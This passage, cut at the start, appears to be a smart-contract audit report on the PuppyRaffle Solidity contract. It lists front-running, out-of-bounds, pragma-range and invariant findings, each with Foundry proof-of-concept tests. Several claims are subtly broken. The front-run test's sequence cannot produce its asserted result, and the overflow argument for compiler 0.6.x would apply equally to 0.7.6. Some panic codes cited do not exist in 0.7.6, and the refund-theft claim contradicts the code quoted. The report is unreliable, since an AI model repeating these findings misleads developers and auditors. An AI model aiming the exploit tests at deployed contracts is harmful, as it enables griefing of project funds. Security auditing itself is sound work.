            "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;   // <-- value sent out
    totalFees = 0;                        // <-- state reset
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```
Because anybody can call the function, the owner (or the party that controls `feeAddress`) can be front-run or griefed:
• Fees may be withdrawn **earlier than intended** (for accounting or marketing reasons).
• If the owner is about to change `feeAddress`, a front-runner can call `withdrawFees()` first, so the ETH goes to the **old address**, making the new address receive nothing.
• After the external call succeeds, `totalFees` is reset to `0`, permanently blocking the legitimate caller from withdrawing again (until new fees accumulate).


## Impact
A malicious actor can force premature withdrawals and send the protocol fees to an outdated `feeAddress`, potentially causing permanent fund loss for the project team and breaking revenue accounting. The attacker does not obtain the ETH directly but can still inflict financial and reputational damage.

## Proof of Concept
1. Owner accumulates 100 ETH of fees and broadcasts two transactions in the same block:
   a) `changeFeeAddress(NEW)`
   b) `withdrawFees()`
2. An observer notices the pending transactions and sends a single `withdrawFees()` transaction that is mined **before** the owner's transactions.
3. The contract checks that `address(this).balance == totalFees` (true) and transfers the 100 ETH **to the OLD feeAddress**.
4. Owner’s later call to `withdrawFees()` reverts (totalFees is now 0), and the ETH is irretrievable unless the owner controls the old fee address.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract WithdrawFrontRun is Test {
    PuppyRaffle raffle;
    address payable owner  = payable(address(0x1));
    address payable oldFee = payable(address(0x2));
    address payable newFee = payable(address(0x3));
    address attacker       = address(0x4);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        raffle = new PuppyRaffle(/*entranceFee*/ 0.1 ether, oldFee, /*raffleDuration*/ 1 days);
        // Pretend some raffles already happened and 10 ether of fees accumulated
        vm.deal(address(raffle), 10 ether);
        vm.store(address(raffle), bytes32(uint256(6)), bytes32(uint64(10 ether))); // totalFees slot index 6
    }

    function test_FrontRunWithdraw() public {
        // Owner plans to update feeAddress then withdraw
        vm.prank(owner);
        raffle.changeFeeAddress(newFee);
        // Attacker front-runs withdraw before owner can do it
        vm.prank(attacker);
        raffle.withdrawFees();
        // Ether went to oldFee, not newFee
        assertEq(oldFee.balance, 10 ether);
        assertEq(newFee.balance, 0);
    }
}
```

## Suggested Mitigation
Add an access-control modifier (e.g., `onlyOwner`) or a dedicated `onlyFeeCollector` role to `withdrawFees()` so that only authorized accounts can trigger the payout.

```solidity
function withdrawFees() external onlyOwner {
    require(address(this).balance == uint256(totalFees),
            "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```
Alternatively, remove the external function entirely and rely on the fee address pulling the fees when desired.

## [L-2]. Unchecked array index in PuppyRaffle::refund allows out-of-bounds read

## Description
The public `refund(uint256 playerIndex)` function directly indexes the `players` array with the user–supplied `playerIndex` without first validating that `playerIndex < players.length`.

```solidity
address playerAddress = players[playerIndex];   // <-- may revert
```

If `playerIndex` is greater than or equal to `players.length`, the read triggers Solidity’s panic error 0x32 (array-out-of-bounds) causing the call to revert.

## Impact
Any external caller can make the function revert, preventing legitimate refunds in the same transaction and wasting gas for the sender.

## Proof of Concept
1. Assume `players.length == 1`.
2. Anyone calls `refund(5)`.
3. At runtime `players[5]` is executed with an index ≥ length, the EVM throws, the transaction reverts with panic 0x32.

## Proof of Code
```solidity
function testRefundOutOfBounds() public {
    /* deploy contract and enter a single player */
    raffle.enterRaffle{value: raffle.entranceFee()}(new address[](1));

    vm.expectRevert();
    raffle.refund(5); // out of range
}
```

## Suggested Mitigation
Validate the supplied index before reading the array:
```solidity
require(playerIndex < players.length, "Invalid index");
```

## [L-3]. players.length underflow in PuppyRaffle::enterRaffle causes out-of-bounds access

## Description
`enterRaffle()` performs a duplicate-check after pushing the new entrants:

```solidity
for (uint i = 0; i < players.length - 1; i++) {
    for (uint j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "Duplicate player");
    }
}
```

When `players.length` is *zero* (e.g. the very first call passes an empty `address[] newPlayers`), `players.length - 1` underflows to `2**256-1`. The outer loop condition `i < players.length - 1` therefore evaluates to `true` and the body executes. The very first statement inside the inner loop attempts to read `players[i]` where `i == 0` but `players.length == 0`, leading to an out-of-bounds read and an immediate revert (panic 0x32). The call is fully feasible because the function allows `newPlayers.length == 0` and requires `msg.value == entranceFee * 0 == 0`.

## Impact
Anyone can make the function revert at the start of a raffle, blocking legitimate entries until another transaction succeeds. This results in a denial-of-service for that call and unnecessary gas consumption.

## Proof of Concept
```solidity
function testEnterRaffleEmptyArray() public {
    address[] memory empty;
    vm.deal(alice, 1 ether);
    vm.prank(alice);
    vm.expectRevert();
    raffle.enterRaffle(empty); // triggers under-flow and OOB read
}
```

## Proof of Code
See the Foundry test above – the transaction reverts with panic code 0x11 (underflow) or 0x32 (OOB) depending on compiler optimisation.

## Suggested Mitigation
Add an explicit check that at least one address is supplied:
```solidity
require(newPlayers.length > 0, "No players supplied");
```

or rewrite the duplicate-check loop to avoid subtracting one from an unsigned integer.

## [L-4]. Wide open pragma range in third-party libraries

## Description
Several OpenZeppelin utility contracts referenced by `PuppyRaffle` (e.g., `Address.sol`, `Strings.sol`) declare:
```solidity
pragma solidity >=0.6.0 <0.8.0;
```
Such a range spans *two* major Solidity releases and allows compilation with every version starting from 0.6.0 up to (but excluding) 0.8.0.  Because the root contract (`PuppyRaffle.sol`) floats on `^0.7.6`, the effective range becomes **0.7.6 ≤ v < 0.8.0**, yet the library source still compiles under 0.6.x as well, where critical language features (e.g., `try/catch`, custom errors, built-in overflow checks) behave differently or do not exist.

If a legacy tool-chain (Truffle < v5.3, remix default, etc.) silently chooses 0.6.x, the whole project can compile, but:
* built-in overflow checks (added in 0.8.0) are **absent**,
* language keywords (`unchecked {}`) are parsed differently,
* ABI-encoding bugs fixed in 0.7.x re-appear.


## Impact
Compiling the same code base under 0.6.x removes overflow protection and changes revert semantics, leading to potential integer-overflow exploits and incorrect logic execution.

## Proof of Concept
1. Checkout the repo on a CI machine that has `solc` 0.6.12 in `$PATH`.
2. Run `solc --bin src/PuppyRaffle.sol` – compilation succeeds because the pragma range is satisfied.
3. The generated byte-code contains no `checked` arithmetic; malicious inputs that overflow silently wrap-around, allowing an attacker to compute incorrect `prizePool` and drain ETH.

## Proof of Code
```bash
# Compile with older compiler implicitly allowed by the library pragma
solc_0.6.12 src/PuppyRaffle.sol --bin -o ./bin_06

# Notice successful compilation even though 0.6.x lacks overflow checks

# Run forge-based test that overflows on 0.6.x but reverts on 0.7.6
cat <<'EOF' > test/Overflow.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
import "src/PuppyRaffle.sol";
contract Overflow is DSTest {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    function testOverflow() public {
        // Provide crafted players array that makes totalAmountCollected overflow
        address[] memory players = new address[](2**128);
        // will compile on 0.6.x and wrap without revert
        raffle.enterRaffle{value: 0}(players);
    }
}
EOF
```

## Suggested Mitigation
Replace broad ranges with an exact version identical to the root contract or a **tight minor range**.  For example, fork the OZ contracts under audit and change to:
```solidity
pragma solidity 0.7.6;
```
In build tool-chains, enforce the version globally as:
```json
"compilerOptions": {
  "version": "0.7.6"
}
```




# {} Invariant Violations

## 1. Balance Violation

## Description
Only the address that originally paid the entrance fee can receive that specific refund and it can be done at most once.

## Impact
Full theft of all entrance fees by repeatedly calling refund() for every index.

## Proof of Concept
forge test or hardhat: 1) victim enters raffle; 2) attacker calls refund(0) ; expect attacker balance increases.

## Pre-State
victim has entered the raffle and remains in players[], attacker knows victimIndex in the array.

## Post-State
attacker’s ETH balance +entranceFee, victim loses the ability to reclaim; contract balance reduced by entranceFee.

## Suggested Mitigation
Require `require(players[index] == msg.sender, "not your ticket");` and clear state before `Address.sendValue` or add ReentrancyGuard.

## 2. StateMachine Violation

## Description
A single address cannot be recorded twice in the active players list.

## Impact
Uneconomical bias in random selection; attacker can dominate raffle.

## Proof of Concept
loop { enterRaffle([msg.sender]); } observe players[] duplicates.

## Pre-State
raffle open, attacker has sufficient ETH for N*entranceFee

## Post-State
players array contains attacker N times, probability of winning increases proportionally.

## Suggested Mitigation
Call `_isActivePlayer` or maintain a mapping to reject duplicate entries.


